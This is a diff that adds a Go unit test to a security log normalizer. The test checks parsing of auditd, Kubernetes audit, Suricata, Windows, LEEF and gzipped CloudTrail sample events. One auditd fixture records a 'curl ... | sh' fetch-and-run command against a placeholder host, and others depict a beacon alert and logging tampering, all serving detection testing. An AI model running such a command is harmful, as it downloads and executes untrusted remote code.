@@ -1,6 +1,8 @@
 package normalizer
 
 import (
+	"bytes"
+	"compress/gzip"
 	"strings"
 	"testing"
 
@@ -77,6 +79,57 @@ func TestParseAllSevenFormatsAndMalformedTolerance(t *testing.T) {
 	}
 	if mEvs[6].SourceFormat != FormatCEF || mEvs[6].Severity != schema.SeverityHigh || mEvs[6].SrcIP != "198.51.100.44" {
 		t.Fatalf("unexpected cef event: %+v", mEvs[6])
+	}
+}
+
+func TestParseEnterpriseFormatsAndGzip(t *testing.T) {
+	enterpriseLines := strings.Join([]string{
+		`type=EXECVE msg=audit(1764237600.123:901): node=app-01 acct="ops" exe="/usr/bin/curl" proctitle="curl https://dl.example.invalid/s.sh | sh" addr=198.51.100.66`,
+		`{"kind":"Event","auditID":"k8s-1","verb":"create","requestURI":"/api/v1/namespaces/prod/pods/web/exec","requestReceivedTimestamp":"2026-11-27T10:05:00Z","user":{"username":"ci-deployer"},"sourceIPs":["198.51.100.66"],"objectRef":{"resource":"pods","subresource":"exec","namespace":"prod","name":"web"},"responseStatus":{"code":200}}`,
+		`{"timestamp":"2026-11-27T10:05:05Z","event_type":"alert","src_ip":"198.51.100.66","dest_ip":"203.0.113.10","dest_port":443,"proto":"TCP","host":"sensor-01","alert":{"signature_id":2029001,"signature":"ET EXPLOIT Outbound Beacon","severity":1},"dns":{"rrname":"beacon.example.invalid"}}`,
+		`{"EventID":4625,"TimeCreated":"2026-11-27T10:05:10Z","Computer":"win-dc-01","Channel":"Security","TargetUserName":"admin","IpAddress":"198.51.100.66"}`,
+		`LEEF:2.0|IBM|QRadarFirewall|1.0|ACL-DENY|^|src=198.51.100.66^dst=203.0.113.10^dstPort=22^devName=fw-01^usrName=guest^sev=8^msg=Inbound SSH probe blocked`,
+	}, "\n")
+
+	evs, stats, err := ParseBytes([]byte(enterpriseLines), FormatAuto, "enterprise.log")
+	if err != nil {
+		t.Fatalf("enterprise parse failed: %v", err)
+	}
+	if len(evs) != 5 || stats.SkippedLines != 0 {
+		t.Fatalf("expected 5 enterprise events, got %d (%+v)", len(evs), stats)
+	}
+	if evs[0].SourceFormat != FormatAuditd || evs[0].Host != "app-01" || evs[0].Severity != schema.SeverityHigh {
+		t.Fatalf("unexpected auditd event: %+v", evs[0])
+	}
+	if evs[1].SourceFormat != FormatK8sAudit || evs[1].Severity != schema.SeverityHigh || evs[1].Metadata["k8s_resource"] != "pods/exec" {
+		t.Fatalf("unexpected k8s-audit event: %+v", evs[1])
+	}
+	if evs[2].SourceFormat != FormatSuricata || evs[2].Severity != schema.SeverityCritical || evs[2].Metadata["domain"] != "beacon.example.invalid" {
+		t.Fatalf("unexpected suricata event: %+v", evs[2])
+	}
+	if evs[3].SourceFormat != FormatWinEVTX || evs[3].Category != "auth" || evs[3].Outcome != "failure" {
+		t.Fatalf("unexpected win-evtx event: %+v", evs[3])
+	}
+	if evs[4].SourceFormat != FormatLEEF || evs[4].DstPort != 22 || evs[4].Host != "fw-01" {
+		t.Fatalf("unexpected leef event: %+v", evs[4])
+	}
+
+	// CloudTrail Records JSON envelope compressed with gzip
+	ctJSON := `{"Records":[{"eventID":"ct-1","eventTime":"2026-11-27T10:06:00Z","eventSource":"cloudtrail.amazonaws.com","eventName":"StopLogging","sourceIPAddress":"198.51.100.66","awsRegion":"us-east-1","userIdentity":{"type":"IAMUser","userName":"compromised-ci"}}]}`
+	var gzBuf bytes.Buffer
+	zw := gzip.NewWriter(&gzBuf)
+	_, _ = zw.Write([]byte(ctJSON))
+	_ = zw.Close()
+
+	ctEvs, ctStats, err := ParseBytes(gzBuf.Bytes(), FormatAuto, "cloudtrail.json.gz")
+	if err != nil {
+		t.Fatalf("gzip cloudtrail parse failed: %v", err)
+	}
+	if len(ctEvs) != 1 || ctStats.ByFormat[FormatCloudTrail] != 1 {
+		t.Fatalf("expected 1 cloudtrail event, got %d (%+v)", len(ctEvs), ctStats)
+	}
+	if ctEvs[0].Action != "log_tamper" || ctEvs[0].Severity != schema.SeverityCritical || ctEvs[0].User != "compromised-ci" {
+		t.Fatalf("unexpected cloudtrail event: %+v", ctEvs[0])
 	}
 }
 
